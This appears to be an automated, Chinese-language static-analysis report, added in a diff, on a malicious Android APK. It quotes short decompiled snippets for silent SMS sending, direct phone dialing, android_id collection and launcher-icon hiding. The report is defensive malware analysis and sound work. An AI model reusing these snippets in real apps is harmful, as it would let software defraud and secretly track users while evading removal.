@@ -1,0 +1,150 @@
+{
+  "APK信息": {
+    "文件名": "4d0f17f8102e13785d735312efafc64bb639df49d6b3e59e9ea6fa7d37ede469.apk",
+    "sha256": "4d0f17f8102e13785d735312efafc64bb639df49d6b3e59e9ea6fa7d37ede469",
+    "包名": "org.mouse.virgin",
+    "应用名": "Пoсланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 187.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\mouse\\virgin\\c;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              UsefulCellar.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "代码通过SmsManager.getDefault().sendTextMessage()在后台静默发送短信，目标号码(str)和短信内容(str2)均来自方法参数，且代码中检查自身是否为默认短信应用以规避Android 4.4+系统的短信发送限制，属于典型的短信欺诈行为，可能导致用户资费消耗。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\mouse\\virgin\\c;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String e(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String e(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  }",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 从系统内容解析器中读取设备的 android_id 唯一标识符，并将其作为字符串返回给调用方。在已确认的恶意样本中，此行为属于设备指纹采集，用于唯一标识和追踪受害设备，采集到的标识符可能被后续代码上传至C2服务器或用于构建设备画像。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\mouse\\virgin\\Swallow;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              UsefulCellar.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "代码使用 ACTION_CALL Intent 直接拨打电话，无需用户在拨号界面二次确认即可发起呼叫。FLAG_ACTIVITY_NEW_TASK (268435456) 允许从非Activity上下文启动拨号。在已确认的恶意样本中，此行为通常用于拨打付费号码造成用户经济损失，或拨打C2号码进行数据外传。数据流向：方法参数 str（电话号码，可能来自远程配置或硬编码）→ ACTION_CALL Intent → startActivity() 静默拨号",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\mouse\\virgin\\Brain;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Flatware.class), 2, 1);",
+          "malicious_code_snippet_context": "          this.b.acquire();\n          c.b(getApplicationContext());\n          f0a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Flatware.class), 2, 1);\n      }\n  }",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将组件 Flatware 的启用状态设置为 COMPONENT_ENABLED_STATE_DISABLED(值=2)，即禁用该组件。Flatware 很可能是应用的启动入口 Activity，禁用后应用图标将从桌面/启动器中消失，用户无法通过图标找到并卸载该应用。这是 Android 恶意软件常用的图标隐藏技术，通常在恶意行为（如短信拦截、隐私窃取）启动后执行，使应用在后台隐蔽运行而用户难以察觉和清除。结合上下文中注册 SMS_RECEIVED 广播接收器和获取 WakeLock 保活的行为，进一步印证了其恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
